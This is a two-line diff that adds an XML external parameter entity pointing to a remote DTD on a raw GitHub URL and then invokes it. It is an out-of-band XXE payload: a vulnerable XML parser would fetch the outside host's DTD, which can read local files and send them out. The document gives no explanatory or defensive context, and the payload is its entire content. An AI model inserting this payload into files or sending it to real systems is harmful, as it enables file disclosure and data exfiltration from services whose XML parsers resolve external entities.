@@ -1,0 +1,2 @@
+<!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/gcocksh/tes/refs/heads/main/e2.dtd">
+%remote;
